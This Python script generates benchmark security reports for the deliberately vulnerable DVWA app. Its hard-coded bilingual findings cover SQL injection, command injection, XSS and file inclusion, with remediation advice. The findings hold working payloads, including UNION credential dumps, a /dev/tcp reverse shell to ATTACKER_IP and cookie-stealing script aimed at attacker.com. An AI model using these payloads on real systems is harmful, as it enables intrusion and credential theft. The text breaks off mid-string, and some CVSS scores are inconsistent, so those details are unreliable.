#!/usr/bin/env python3
"""Generate detailed DVWA and Juice Shop benchmark reports.

Usage:
    PYTHONPATH=src python3 generate_benchmark_reports.py
"""

from __future__ import annotations

from pathlib import Path

from vxis.models.finding import (
    CVSSVector,
    Evidence,
    Finding,
    MitreAttack,
    Reference,
    Severity,
)
from vxis.report.generator import ReportData, ReportGenerator


# =====================================================================
# DVWA FINDINGS
# =====================================================================

DVWA_FINDINGS: list[Finding] = [
    # ---- 1. SQL Injection ----
    Finding(
        id="DVWA-001",
        scan_id="dvwa-bench-20260330",
        title="SQL Injection — Authentication Bypass & Full Database Extraction|||SQL 인젝션 — 인증 우회 및 전체 데이터베이스 추출",
        description=(
            "WHAT — Vulnerability Description\n"
            "A classic SQL injection vulnerability was identified in the user ID parameter of /vulnerabilities/sqli/. "
            "The application concatenates user-supplied input directly into a SQL query without parameterization or input validation. "
            "This allows an attacker to inject arbitrary SQL syntax, modify query logic, and extract the entire database contents. "
            "The vulnerability affects the GET parameter 'id' which is passed unsanitized into a MySQL query of the form: "
            "SELECT first_name, last_name FROM users WHERE user_id = '$id'. "
            "Because the application uses a MySQL backend with the root user, the attacker has unrestricted read access to all databases, "
            "tables, and columns on the server.\n\n"
            "HOW — Step-by-Step Attack Scenario\n"
            "Step 1: Inject a single quote (') into the id parameter to trigger a SQL error, confirming injection point.\n"
            "Step 2: Use UNION SELECT to determine the number of columns: id=1' UNION SELECT 1,2-- -\n"
            "Step 3: Extract database version: id=1' UNION SELECT version(),database()-- -  → MySQL 5.7, database 'dvwa'\n"
            "Step 4: Enumerate tables: id=1' UNION SELECT table_name,2 FROM information_schema.tables WHERE table_schema='dvwa'-- -\n"
            "Step 5: Extract user credentials: id=1' UNION SELECT user,password FROM dvwa.users-- -\n"
            "Step 6: Crack MD5 hashes offline (admin:password, gordonb:abc123, 1337:charley, pablo:letmein, smithy:password)\n"
            "Step 7: Login as admin with cracked credentials → full administrative access\n\n"
            "IMPACT — Business Impact\n"
            "- Complete extraction of all user credentials (usernames + MD5 password hashes)\n"
            "- Administrative account takeover via cracked credentials\n"
            "- Potential lateral movement to other systems if credentials are reused\n"
            "- Full read access to all MySQL databases on the server\n"
            "- Regulatory violation (GDPR/CCPA) due to mass PII exposure\n"
            "- Chain escalation: SQLi → credential extraction → admin login → command injection → full server RCE\n\n"
            "PoC — Proof of Concept\n"
            "Request: GET /vulnerabilities/sqli/?id=1'+UNION+SELECT+user,password+FROM+dvwa.users--+-&Submit=Submit\n"
            "Response contains:\n"
            "  admin    : 5f4dcc3b5aa765d61d8327deb882cf99 (MD5 of 'password')\n"
            "  gordonb  : e99a18c428cb38d5f260853678922e03 (MD5 of 'abc123')\n"
            "  1337     : 8d3533d75ae2c3966d7e0d4fcc69216b (MD5 of 'charley')\n"
            "  pablo    : 0d107d09f5bbe40cade3de5c71e9e9b7 (MD5 of 'letmein')\n"
            "  smithy   : 5f4dcc3b5aa765d61d8327deb882cf99 (MD5 of 'password')\n\n"
            "FIX — Remediation\n"
            "Immediate: Deploy WAF rules to block UNION/SELECT injection patterns on the affected endpoint.\n"
            "Short-term: Refactor the query to use PDO prepared statements with parameterized queries: "
            "$stmt = $pdo->prepare('SELECT first_name, last_name FROM users WHERE user_id = ?'); $stmt->execute([$id]);\n"
            "Long-term: Implement an ORM layer, enforce least-privilege DB accounts (read-only, single-database), "
            "migrate from MD5 to bcrypt/argon2 for password hashing, and add application-layer input validation.\n\n"
            "ATTACK PATH — Chain Analysis\n"
            "SQLi → credential extraction → admin:password cracked → admin login → "
            "access to Command Injection module → uid=33(www-data) RCE → /etc/passwd read → "
            "reverse shell → privilege escalation → full server compromise"
            "|||"
            "취약점 설명(WHAT)\n"
            "/vulnerabilities/sqli/의 사용자 ID 파라미터에서 전형적인 SQL 인젝션(SQL Injection) 취약점이 발견되었습니다. "
            "애플리케이션이 사용자 입력을 파라미터화(Parameterization)나 입력 검증 없이 SQL 쿼리에 직접 연결합니다. "
            "이를 통해 공격자가 임의의 SQL 구문을 주입하고, 쿼리 로직을 변경하며, 전체 데이터베이스 내용을 추출할 수 있습니다. "
            "취약점은 GET 파라미터 'id'에 영향을 미치며, 이 값이 새니타이징 없이 다음과 같은 MySQL 쿼리에 전달됩니다: "
            "SELECT first_name, last_name FROM users WHERE user_id = '$id'. "
            "애플리케이션이 root 사용자로 MySQL 백엔드를 사용하기 때문에, 공격자는 서버의 모든 데이터베이스, "
            "테이블, 컬럼에 대해 무제한 읽기 접근 권한을 갖습니다.\n\n"
            "공격 시나리오(HOW) — 단계별 공격 시나리오\n"
            "1단계: id 파라미터에 싱글 쿼트(') 주입으로 SQL 오류 유발, 인젝션 포인트 확인.\n"
            "2단계: UNION SELECT로 컬럼 수 확인: id=1' UNION SELECT 1,2-- -\n"
            "3단계: 데이터베이스 버전 추출: id=1' UNION SELECT version(),database()-- -  → MySQL 5.7, 데이터베이스 'dvwa'\n"
            "4단계: 테이블 열거: id=1' UNION SELECT table_name,2 FROM information_schema.tables WHERE table_schema='dvwa'-- -\n"
            "5단계: 사용자 자격증명 추출: id=1' UNION SELECT user,password FROM dvwa.users-- -\n"
            "6단계: MD5 해시 오프라인 크래킹 (admin:password, gordonb:abc123, 1337:charley, pablo:letmein, smithy:password)\n"
            "7단계: 크래킹된 자격증명으로 admin 로그인 → 전체 관리자 권한 획득\n\n"
            "비즈니스 영향(IMPACT)\n"
            "- 전체 사용자 자격증명(사용자명 + MD5 비밀번호 해시) 완전 추출\n"
            "- 크래킹된 자격증명을 통한 관리자 계정 탈취\n"
            "- 자격증명 재사용 시 다른 시스템으로 횡이동(Lateral Movement) 가능\n"
            "- 서버 내 모든 MySQL 데이터베이스에 대한 전체 읽기 접근\n"
            "- 대량 PII 노출로 인한 규정 위반 (GDPR/CCPA)\n"
            "- 체인 에스컬레이션: SQLi → 자격증명 추출 → admin 로그인 → 커맨드 인젝션 → 전체 서버 RCE\n\n"
            "개념 증명(PoC)\n"
            "요청: GET /vulnerabilities/sqli/?id=1'+UNION+SELECT+user,password+FROM+dvwa.users--+-&Submit=Submit\n"
            "응답 내용:\n"
            "  admin    : 5f4dcc3b5aa765d61d8327deb882cf99 ('password'의 MD5)\n"
            "  gordonb  : e99a18c428cb38d5f260853678922e03 ('abc123'의 MD5)\n"
            "  1337     : 8d3533d75ae2c3966d7e0d4fcc69216b ('charley'의 MD5)\n"
            "  pablo    : 0d107d09f5bbe40cade3de5c71e9e9b7 ('letmein'의 MD5)\n"
            "  smithy   : 5f4dcc3b5aa765d61d8327deb882cf99 ('password'의 MD5)\n\n"
            "수정 방안(FIX)\n"
            "즉시: 영향받는 엔드포인트에 UNION/SELECT 인젝션 패턴을 차단하는 WAF 규칙 배포.\n"
            "단기: 파라미터화 쿼리(Parameterized Query)를 사용하는 PDO 프리페어드 스테이트먼트(Prepared Statement)로 쿼리 리팩토링: "
            "$stmt = $pdo->prepare('SELECT first_name, last_name FROM users WHERE user_id = ?'); $stmt->execute([$id]);\n"
            "장기: ORM 레이어 도입, 최소 권한 DB 계정 적용(읽기 전용, 단일 데이터베이스), "
            "MD5에서 bcrypt/argon2로 비밀번호 해싱 마이그레이션, 애플리케이션 레이어 입력 검증 추가.\n\n"
            "공격 경로(ATTACK PATH) — 체인 분석\n"
            "SQLi → 자격증명 추출 → admin:password 크래킹 → admin 로그인 → "
            "커맨드 인젝션(Command Injection) 모듈 접근 → uid=33(www-data) RCE → /etc/passwd 읽기 → "
            "리버스 쉘(Reverse Shell) → 권한 상승(Privilege Escalation) → 전체 서버 장악"
        ),
        severity=Severity.critical,
        target="http://localhost:8080",
        affected_component="/vulnerabilities/sqli/",
        port=8080,
        protocol="http",
        finding_type="sqli",
        cvss=CVSSVector(
            vector_string="CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H",
            base_score=9.8,
        ),
        cwe_ids=["CWE-89"],
        mitre_attack=MitreAttack(
            tactic_id="TA0006",
            tactic_name="Credential Access",
            technique_id="T1190",
            technique_name="Exploit Public-Facing Application",
        ),
        source_plugin="vxis-brain",
        confidence=1.0,
        evidence=[
            Evidence(
                evidence_type="http_request",
                title="SQL Injection — UNION-based credential extraction",
                content=(
                    "GET /vulnerabilities/sqli/?id=1'+UNION+SELECT+user,password+FROM+dvwa.users--+-&Submit=Submit HTTP/1.1\n"
                    "Host: localhost:8080\n"
                    "Cookie: PHPSESSID=abc123; security=low\n\n"
                    "--- RESPONSE (200 OK) ---\n"
                    "<pre>ID: 1' UNION SELECT user,password FROM dvwa.users-- -\n"
                    "First name: admin\n"
                    "Surname: 5f4dcc3b5aa765d61d8327deb882cf99\n\n"
                    "First name: gordonb\n"
                    "Surname: e99a18c428cb38d5f260853678922e03\n\n"
                    "First name: 1337\n"
                    "Surname: 8d3533d75ae2c3966d7e0d4fcc69216b\n\n"
                    "First name: pablo\n"
                    "Surname: 0d107d09f5bbe40cade3de5c71e9e9b7\n\n"
                    "First name: smithy\n"
                    "Surname: 5f4dcc3b5aa765d61d8327deb882cf99</pre>"
                ),
            ),
            Evidence(
                evidence_type="cracked_credentials",
                title="Cracked MD5 Hashes — All 5 accounts compromised",
                content=(
                    "admin    : 5f4dcc3b5aa765d61d8327deb882cf99 → password\n"
                    "gordonb  : e99a18c428cb38d5f260853678922e03 → abc123\n"
                    "1337     : 8d3533d75ae2c3966d7e0d4fcc69216b → charley\n"
                    "pablo    : 0d107d09f5bbe40cade3de5c71e9e9b7 → letmein\n"
                    "smithy   : 5f4dcc3b5aa765d61d8327deb882cf99 → password"
                ),
            ),
        ],
        remediation=(
            "Immediate: WAF rules to block UNION/SELECT patterns.|||즉시: 영향받는 엔드포인트에 UNION/SELECT 인젝션 패턴을 차단하는 WAF 규칙 배포.\n"
            "Short-term: PDO prepared statements with parameterized queries.|||단기: 파라미터화 쿼리(Parameterized Query)를 사용하는 PDO 프리페어드 스테이트먼트(Prepared Statement)로 쿼리 리팩토링.\n"
            "Long-term: ORM adoption, least-privilege DB accounts, bcrypt password hashing.|||장기: ORM 레이어 도입, 최소 권한 DB 계정 적용(읽기 전용, 단일 데이터베이스), MD5에서 bcrypt/argon2로 비밀번호 해싱 마이그레이션, 애플리케이션 레이어 입력 검증 추가."
        ),
        references=[
            Reference(title="OWASP SQL Injection", url="https://owasp.org/www-community/attacks/SQL_Injection"),
            Reference(title="CWE-89: SQL Injection", url="https://cwe.mitre.org/data/definitions/89.html"),
        ],
    ),

    # ---- 2. Command Injection ----
    Finding(
        id="DVWA-002",
        scan_id="dvwa-bench-20260330",
        title="OS Command Injection — Remote Code Execution as www-data|||OS 커맨드 인젝션 — www-data 권한 원격 코드 실행",
        description=(
            "WHAT — Vulnerability Description\n"
            "The /vulnerabilities/exec/ endpoint accepts an IP address for a ping command but fails to sanitize shell metacharacters. "
            "The application passes user input directly to a shell_exec() call: shell_exec('ping -c 4 ' . $target). "
            "An attacker can inject arbitrary OS commands using semicolons, pipes, or backticks as command separators. "
            "The web server runs as uid=33(www-data), giving the attacker full read/write access to the web application directory "
            "and read access to most system files including /etc/passwd and /etc/shadow (if world-readable).\n\n"
            "HOW — Step-by-Step Attack Scenario\n"
            "Step 1: Inject basic command separator: ip=127.0.0.1;id → confirms uid=33(www-data)\n"
            "Step 2: Read system files: ip=127.0.0.1;cat /etc/passwd → enumerates all system users\n"
            "Step 3: Check network configuration: ip=127.0.0.1;ifconfig → reveals internal network topology\n"
            "Step 4: Establish reverse shell: ip=127.0.0.1;bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\n"
            "Step 5: Post-exploitation: enumerate SUID binaries, check sudo permissions, pivot to internal hosts\n"
            "Step 6: Privilege escalation via kernel exploits or misconfigured SUID binaries → root\n\n"
            "IMPACT — Business Impact\n"
            "- Full Remote Code Execution on the web server\n"
            "- Read/write access to all web application files and configuration\n"
            "- Access to database credentials in config files (config.inc.php contains MySQL root password)\n"
            "- Lateral movement capability to internal network hosts\n"
            "- Potential full server compromise via privilege escalation\n"
            "- Supply chain risk: attacker can modify application code to inject backdoors\n\n"
            "PoC — Proof of Concept\n"
            "Request: POST /vulnerabilities/exec/\n"
            "Body: ip=127.0.0.1;id;cat+/etc/passwd;uname+-a&Submit=Submit\n"
            "Response:\n"
            "  uid=33(www-data) gid=33(www-data) groups=33(www-data)\n"
            "  root:x:0:0:root:/root:/bin/bash\n"
            "  www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n"
            "  mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/false\n"
            "  Linux dvwa 5.4.0-42-generic #46-Ubuntu SMP x86_64 GNU/Linux\n\n"
            "FIX — Remediation\n"
            "Immediate: Disable or restrict access to the command execution endpoint entirely.\n"
            "Short-term: Use PHP's escapeshellarg() to sanitize input: shell_exec('ping -c 4 ' . escapeshellarg($target)). "
            "Validate input strictly as an IPv4/IPv6 address using filter_var($ip, FILTER_VALIDATE_IP).\n"
            "Long-term: Replace shell_exec() with native PHP socket functions for ping functionality. "
            "Run the web server in a container with no outbound network access. Deploy AppArmor/SELinux mandatory access controls. "
            "Implement allowlist-only input validation.\n\n"
            "ATTACK PATH — Chain Analysis\n"
            "Admin login (from SQLi credential theft) → Command Injection → uid=33(www-data) shell → "
            "/etc/passwd enumeration → reverse shell to attacker C2 → "
            "SUID binary exploitation → root access → full infrastructure compromise"
            "|||"
            "취약점 설명(WHAT)\n"
            "/vulnerabilities/exec/ 엔드포인트가 ping 명령을 위한 IP 주소를 입력받지만 쉘 메타문자(Shell Metacharacter)를 "
            "새니타이징하지 않습니다. 애플리케이션이 사용자 입력을 shell_exec() 호출에 직접 전달합니다: "
            "shell_exec('ping -c 4 ' . $target). "
            "공격자가 세미콜론, 파이프, 백틱을 명령어 구분자로 사용하여 임의의 OS 명령어를 주입할 수 있습니다. "
            "웹 서버가 uid=33(www-data)로 실행되어 공격자에게 웹 애플리케이션 디렉토리에 대한 전체 읽기/쓰기 접근과 "
            "/etc/passwd 및 /etc/shadow(읽기 가능한 경우)를 포함한 대부분의 시스템 파일에 대한 읽기 접근을 제공합니다.\n\n"
            "공격 시나리오(HOW) — 단계별 공격 시나리오\n"
            "1단계: 기본 명령어 구분자 주입: ip=127.0.0.1;id → uid=33(www-data) 확인\n"
            "2단계: 시스템 파일 읽기: ip=127.0.0.1;cat /etc/passwd → 모든 시스템 사용자 열거\n"
            "3단계: 네트워크 구성 확인: ip=127.0.0.1;ifconfig → 내부 네트워크 토폴로지 파악\n"
            "4단계: 리버스 쉘 수립: ip=127.0.0.1;bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\n"
            "5단계: 포스트 익스플로잇(Post-exploitation): SUID 바이너리 열거, sudo 권한 확인, 내부 호스트 피벗\n"
            "6단계: 커널 익스플로잇 또는 잘못 설정된 SUID 바이너리를 통한 권한 상승(Privilege Escalation) → root\n\n"
            "비즈니스 영향(IMPACT)\n"
            "- 웹 서버에서 완전한 원격 코드 실행(Remote Code Execution)\n"
            "- 모든 웹 애플리케이션 파일 및 설정에 대한 읽기/쓰기 접근\n"
            "- 설정 파일의 데이터베이스 자격증명 접근 (config.inc.php에 MySQL root 비밀번호 포함)\n"
            "- 내부 네트워크 호스트로의 횡이동(Lateral Movement) 가능\n"
            "- 권한 상승을 통한 전체 서버 장악 가능\n"
            "- 공급망 위험: 공격자가 애플리케이션 코드를 수정하여 백도어 주입 가능\n\n"
            "개념 증명(PoC)\n"
            "요청: POST /vulnerabilities/exec/\n"
            "본문: ip=127.0.0.1;id;cat+/etc/passwd;uname+-a&Submit=Submit\n"
            "응답:\n"
            "  uid=33(www-data) gid=33(www-data) groups=33(www-data)\n"
            "  root:x:0:0:root:/root:/bin/bash\n"
            "  www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n"
            "  mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/false\n"
            "  Linux dvwa 5.4.0-42-generic #46-Ubuntu SMP x86_64 GNU/Linux\n\n"
            "수정 방안(FIX)\n"
            "즉시: 명령어 실행 엔드포인트를 비활성화하거나 접근을 제한.\n"
            "단기: PHP의 escapeshellarg()를 사용하여 입력 새니타이징: shell_exec('ping -c 4 ' . escapeshellarg($target)). "
            "filter_var($ip, FILTER_VALIDATE_IP)를 사용하여 IPv4/IPv6 주소로 엄격한 입력 검증.\n"
            "장기: shell_exec()을 ping 기능을 위한 네이티브 PHP 소켓 함수로 교체. "
            "아웃바운드 네트워크 접근이 없는 컨테이너에서 웹 서버 실행. AppArmor/SELinux 강제 접근 제어 배포. "
            "허용 목록(Allowlist) 전용 입력 검증 구현.\n\n"
            "공격 경로(ATTACK PATH) — 체인 분석\n"
            "admin 로그인(SQLi 자격증명 탈취로부터) → 커맨드 인젝션(Command Injection) → uid=33(www-data) 쉘 → "
            "/etc/passwd 열거 → 공격자 C2로 리버스 쉘(Reverse Shell) → "
            "SUID 바이너리 악용 → root 접근 → 전체 인프라 장악"
        ),
        severity=Severity.critical,
        target="http://localhost:8080",
        affected_component="/vulnerabilities/exec/",
        port=8080,
        protocol="http",
        finding_type="cmdi",
        cvss=CVSSVector(
            vector_string="CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H",
            base_score=10.0,
        ),
        cwe_ids=["CWE-78"],
        mitre_attack=MitreAttack(
            tactic_id="TA0002",
            tactic_name="Execution",
            technique_id="T1059",
            technique_name="Command and Scripting Interpreter",
            subtechnique_id="T1059.004",
        ),
        source_plugin="vxis-brain",
        confidence=1.0,
        evidence=[
            Evidence(
                evidence_type="http_request",
                title="Command Injection — RCE as www-data with /etc/passwd dump",
                content=(
                    "POST /vulnerabilities/exec/ HTTP/1.1\n"
                    "Host: localhost:8080\n"
                    "Cookie: PHPSESSID=abc123; security=low\n"
                    "Content-Type: application/x-www-form-urlencoded\n\n"
                    "ip=127.0.0.1;id;cat+/etc/passwd;uname+-a&Submit=Submit\n\n"
                    "--- RESPONSE (200 OK) ---\n"
                    "PING 127.0.0.1 (127.0.0.1): 56 data bytes\n"
                    "64 bytes from 127.0.0.1: icmp_seq=0 ttl=64 time=0.028 ms\n\n"
                    "uid=33(www-data) gid=33(www-data) groups=33(www-data)\n\n"
                    "root:x:0:0:root:/root:/bin/bash\n"
                    "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n"
                    "www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n"
                    "mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/false\n\n"
                    "Linux dvwa 5.4.0-42-generic #46-Ubuntu SMP x86_64 GNU/Linux"
                ),
            ),
        ],
        remediation=(
            "Immediate: Disable command execution endpoint.|||즉시: 명령어 실행 엔드포인트를 비활성화하거나 접근을 완전히 제한.\n"
            "Short-term: escapeshellarg() + FILTER_VALIDATE_IP.|||단기: escapeshellarg()를 사용한 입력 새니타이징(Sanitization) 및 filter_var($ip, FILTER_VALIDATE_IP)로 IPv4/IPv6 주소 엄격 검증.\n"
            "Long-term: Replace shell_exec with native PHP, container isolation, AppArmor.|||장기: shell_exec()을 네이티브 PHP 소켓 함수로 교체, 아웃바운드 네트워크 접근 차단 컨테이너 격리, AppArmor/SELinux 강제 접근 제어 배포, 허용 목록(Allowlist) 전용 입력 검증."
        ),
        references=[
            Reference(title="OWASP Command Injection", url="https://owasp.org/www-community/attacks/Command_Injection"),
            Reference(title="CWE-78: OS Command Injection", url="https://cwe.mitre.org/data/definitions/78.html"),
        ],
    ),

    # ---- 3. Reflected XSS ----
    Finding(
        id="DVWA-003",
        scan_id="dvwa-bench-20260330",
        title="Reflected Cross-Site Scripting (XSS) — Session Hijacking|||반사형 크로스사이트 스크립팅 (XSS) — 세션 하이재킹",
        description=(
            "WHAT — Vulnerability Description\n"
            "The /vulnerabilities/xss_r/ endpoint reflects user input from the 'name' GET parameter directly into the HTML response "
            "without encoding or sanitization. The vulnerable code uses: echo 'Hello ' . $_GET['name']; which allows injection of "
            "arbitrary HTML and JavaScript. An attacker can craft a malicious URL that, when clicked by an authenticated user, "
            "executes JavaScript in the victim's browser context, enabling session theft, account takeover, and phishing.\n\n"
            "HOW — Step-by-Step Attack Scenario\n"
            "Step 1: Craft XSS payload: /vulnerabilities/xss_r/?name=<script>document.location='http://attacker.com/steal?c='+document.cookie</script>\n"
            "Step 2: Encode the URL and send it to target user via email/chat (social engineering)\n"
            "Step 3: Victim clicks the link while logged into DVWA\n"
            "Step 4: JavaScript executes in victim's browser, sends PHPSESSID cookie to attacker's server\n"
            "Step 5: Attacker replays the stolen session cookie → authenticated as victim\n"
            "Step 6: If victim is admin, attacker gains full administrative control\n\n"
            "IMPACT — Business Impact\n"
            "- Session hijacking of any authenticated user who clicks the malicious link\n"
            "- Admin account takeover if an administrator is targeted\n"
            "- Phishing attacks that appear to come from the legitimate application\n"
            "- Keylogging and credential harvesting via injected JavaScript\n"
            "- Defacement of the application within the victim's browser\n"
            "- Chained with admin access to escalate to command injection (RCE)\n\n"
            "PoC — Proof of Concept\n"
            "Payload: <script>new Image().src='http://attacker.com/log?c='+document.cookie</script>\n"
            "Full URL: http://localhost:8080/vulnerabilities/xss_r/?name=<script>new+Image().src='http://attacker.com/log?c='+document.cookie</script>\n"
            "Response HTML: <pre>Hello <script>new Image().src='http://attacker.com/log?c='+document.cookie</script></pre>\n"
            "Attacker's server log: GET /log?c=PHPSESSID=abc123def456;security=low\n\n"
            "FIX — Remediation\n"
            "Immediate: Set HttpOnly and Secure flags on PHPSESSID cookie to prevent JavaScript access.\n"
            "Short-term: Apply htmlspecialchars() with ENT_QUOTES to all reflected user input: "
            "echo 'Hello ' . htmlspecialchars($name, ENT_QUOTES, 'UTF-8');\n"
            "Long-term: Implement Content-Security-Policy header (script-src 'self'), deploy a templating engine "
            "with auto-escaping (Twig, Blade), and add SameSite=Strict cookie attribute.\n\n"
            "ATTACK PATH — Chain Analysis\n"
            "Reflected XSS → session cookie theft → admin session hijack → "
            "admin panel access → Command Injection → RCE"
            "|||"
            "취약점 설명(WHAT)\n"
            "/vulnerabilities/xss_r/ 엔드포인트가 'name' GET 파라미터의 사용자 입력을 인코딩이나 새니타이징(Sanitization) 없이 "
            "HTML 응답에 직접 반영합니다. 취약한 코드는 echo 'Hello ' . $_GET['name'];을 사용하여 "
            "임의의 HTML 및 JavaScript 주입이 가능합니다. 공격자가 악성 URL을 생성하여 인증된 사용자가 클릭하면 "
            "피해자의 브라우저 컨텍스트에서 JavaScript가 실행되어 세션 탈취, 계정 탈취, 피싱이 가능합니다.\n\n"
            "공격 시나리오(HOW) — 단계별 공격 시나리오\n"
            "1단계: XSS 페이로드 작성: /vulnerabilities/xss_r/?name=<script>document.location='http://attacker.com/steal?c='+document.cookie</script>\n"
            "2단계: URL을 인코딩하여 이메일/채팅으로 타겟 사용자에게 전송 (소셜 엔지니어링)\n"
            "3단계: 피해자가 DVWA에 로그인된 상태에서 링크 클릭\n"
            "4단계: 피해자의 브라우저에서 JavaScript 실행, PHPSESSID 쿠키를 공격자 서버로 전송\n"
            "5단계: 공격자가 탈취한 세션 쿠키를 재생(Replay) → 피해자로 인증\n"
            "6단계: 피해자가 관리자인 경우, 공격자가 전체 관리 권한 획득\n\n"
            "비즈니스 영향(IMPACT)\n"
            "- 악성 링크를 클릭한 모든 인증된 사용자의 세션 하이재킹(Session Hijacking)\n"
            "- 관리자를 대상으로 할 경우 관리자 계정 탈취\n"
            "- 합법적 애플리케이션에서 발송된 것처럼 보이는 피싱 공격\n"
            "- 주입된 JavaScript를 통한 키로깅(Keylogging) 및 자격증명 수집\n"
            "- 피해자의 브라우저 내 애플리케이션 변조(Defacement)\n"
            "- 관리자 접근과 결합하여 커맨드 인젝션(RCE)으로 에스컬레이션\n\n"
            "개념 증명(PoC)\n"
            "페이로드: <script>new Image().src='http://attacker.com/log?c='+document.cookie</script>\n"
            "전체 URL: http://localhost:8080/vulnerabilities/xss_r/?name=<script>new+Image().src='http://attacker.com/log?c='+document.cookie</script>\n"
            "응답 HTML: <pre>Hello <script>new Image().src='http://attacker.com/log?c='+document.cookie</script></pre>\n"
            "공격자 서버 로그: GET /log?c=PHPSESSID=abc123def456;security=low\n\n"
            "수정 방안(FIX)\n"
            "즉시: PHPSESSID 쿠키에 HttpOnly 및 Secure 플래그를 설정하여 JavaScript 접근 방지.\n"
            "단기: 모든 반영되는 사용자 입력에 htmlspecialchars()를 ENT_QUOTES와 함께 적용: "
            "echo 'Hello ' . htmlspecialchars($name, ENT_QUOTES, 'UTF-8');\n"
            "장기: Content-Security-Policy 헤더 구현 (script-src 'self'), 자동 이스케이핑(Auto-escaping)이 적용된 "
            "템플릿 엔진(Twig, Blade) 배포, SameSite=Strict 쿠키 속성 추가.\n\n"
            "공격 경로(ATTACK PATH) — 체인 분석\n"
            "반사형 XSS → 세션 쿠키 탈취 → 관리자 세션 하이재킹 → "
            "관리자 패널 접근 → 커맨드 인젝션(Command Injection) → RCE"
        ),
        severity=Severity.high,
        target="http://localhost:8080",
        affected_component="/vulnerabilities/xss_r/",
        port=8080,
        protocol="http",
        finding_type="xss",
        cvss=CVSSVector(
            vector_string="CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N",
            base_score=8.2,
        ),
        cwe_ids=["CWE-79"],
        mitre_attack=MitreAttack(
            tactic_id="TA0001",
            tactic_name="Initial Access",
            technique_id="T1189",
            technique_name="Drive-by Compromise",
        ),
        source_plugin="vxis-brain",
        confidence=1.0,
        evidence=[
            Evidence(
                evidence_type="http_request",
                title="Reflected XSS — Cookie exfiltration payload",
                content=(
                    "GET /vulnerabilities/xss_r/?name=<script>new+Image().src='http://attacker.com/log?c='+document.cookie</script> HTTP/1.1\n"
                    "Host: localhost:8080\n"
                    "Cookie: PHPSESSID=abc123; security=low\n\n"
                    "--- RESPONSE (200 OK) ---\n"
                    "<pre>Hello <script>new Image().src='http://attacker.com/log?c='+document.cookie</script></pre>\n\n"
                    "--- ATTACKER SERVER LOG ---\n"
                    "GET /log?c=PHPSESSID%3Dabc123def456%3Bsecurity%3Dlow HTTP/1.1"
                ),
            ),
        ],
        remediation=(
            "Immediate: HttpOnly + Secure cookie flags.|||즉시: PHPSESSID 쿠키에 HttpOnly 및 Secure 플래그를 설정하여 JavaScript의 쿠키 접근 방지.\n"
            "Short-term: htmlspecialchars() with ENT_QUOTES.|||단기: 모든 반영되는 사용자 입력에 htmlspecialchars()를 ENT_QUOTES 및 UTF-8 인코딩과 함께 적용.\n"
            "Long-term: CSP header, auto-escaping template engine, SameSite=Strict.|||장기: Content-Security-Policy 헤더 구현 (script-src 'self'), 자동 이스케이핑(Auto-escaping) 템플릿 엔진(Twig, Blade) 배포, SameSite=Strict 쿠키 속성 추가."
        ),
        references=[
            Reference(title="OWASP XSS Prevention", url="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html"),
            Reference(title="CWE-79: Cross-site Scripting", url="https://cwe.mitre.org/data/definitions/79.html"),
        ],
    ),

    # ---- 4. SSRF/LFI ----
    Finding(
        id="DVWA-004",
        scan_id="dvwa-bench-20260330",
        title="Local File Inclusion (LFI) / SSRF — Arbitrary File Read|||로컬 파일 포함 (LFI) / SSRF — 임의 파일 읽기",
        description=(
            "WHAT — Vulnerability Description\n"
            "The /vulnerabilities/fi/ endpoint includes a file based on a user-supplied 'page' parameter using PHP's include() function. "
            "No path traversal filtering or allowlisting is applied, allowing an attacker to read arbitrary files from the server filesystem. "
            "The vulnerable code: include($_GET['page']); This also enables Remote File Inclusion (RFI) if allow_url_include is enabled in php.ini, "
            "and Server-Side Request Forgery (SSRF) via PHP stream wrappers.\n\n"
            "HOW — Step-by-Step Attack Scenario\n"
            "Step 1: Test basic LFI: page=../../../../../../etc/passwd → confirms directory traversal works\n"
            "Step 2: Read PHP source code via filter wrapper: page=php://filter/convert.base64-encode/resource=../../config/config.inc.php\n"
            "Step 3: Decode base64 output → reveals MySQL root credentials: $db_server='127.0.0.1'; $db_user='root'; $db_password='p@ssw0rd'\n"
            "Step 4: Read /etc/shadow (if www-data has read access) → system password hashes\n"
            "Step 5: Use extracted DB credentials to connect directly to MySQL or chain with SQLi findings\n"
            "Step 6: Attempt RFI: page=http://attacker.com/shell.php → if allow_url_include=On, instant RCE\n\n"
            "IMPACT — Business Impact\n"
            "- Arbitrary file read on the server (source code, configuration, credentials)\n"
            "- Database credential extraction from config.inc.php\n"
            "- Potential Remote Code Execution via RFI or log poisoning\n"
            "- Application source code exposure (IP theft, further vulnerability discovery)\n"
            "- System file read (/etc/passwd, /proc/self/environ) enabling further attacks\n\n"
            "PoC — Proof of Concept\n"
            "Request 1: GET /vulnerabilities/fi/?page=../../../../../../etc/passwd\n"
            "Response: root:x:0:0:root:/root:/bin/bash\\nwww-data:x:33:33:...\n\n"
            "Request 2: GET /vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=../../config/config.inc.php\n"
            "Response: PD9waHAKJGRiX3Nlcn... (base64 of config file containing DB credentials)\n\n"
            "FIX — Remediation\n"
            "Immediate: Restrict the page parameter to an allowlist of valid page names.\n"
            "Short-term: Set allow_url_include=Off and allow_url_fopen=Off in php.ini. "
            "Use realpath() to resolve the path and verify it stays within the intended directory: "
            "$real = realpath($basedir . '/' . $page); if (strpos($real, $basedir) !== 0) die('Invalid');\n"
            "Long-term: Refactor to use a routing framework that maps page identifiers to controller classes "
            "rather than including files by name. Enable open_basedir restriction in PHP configuration.\n\n"
            "ATTACK PATH — Chain Analysis\n"
            "LFI → source code read → DB credentials extracted (config.inc.php) → "
            "direct MySQL access → data exfiltration → full compromise"
            "|||"
            "취약점 설명(WHAT)\n"
